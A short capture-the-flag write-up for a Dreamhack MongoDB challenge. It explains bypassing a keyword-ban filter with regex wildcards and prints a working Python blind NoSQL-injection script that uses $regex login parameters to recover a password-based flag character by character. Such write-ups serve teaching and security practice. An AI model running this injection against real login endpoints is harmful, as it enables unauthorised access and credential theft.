# This exercise is set to MongoDB.

### It has filter like below.
#### filter )
```js
filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
#It returns True if banned keyword is included in your input.
```

### But filtering keyword is not secure. We can use sqli untill the fundamental vulerabililty exists.
> filtering is easily paralyzed by using regular expression "." that mean every character. ex) admin -> ad.in , DH{ -> D.{
### Here is the exploit code use blind sqli )
```py
import requests, string

HOST = 'http://host3.dreamhack.games:13265'
SUCCESS = 'admin'
ALPHANUMERIC = string.digits + string.ascii_letters

i = 1
while True:
    res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=.{{{i}}}')
    if res.text == SUCCESS:
        i += 1
    else:
        i -= 1
        break;
print(f'length of password : {i}')

flag = ''
for k in range(i-4):
    for ch in ALPHANUMERIC:
        res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=D.{{{flag}{ch}')
        if res.text == SUCCESS:
            flag += ch
            break

print(f'flag : DH{{{flag}}}')
```
first, code find the length of the password and then, using for loop with range(LENGTH OF PWD), find flag by repeating substition.
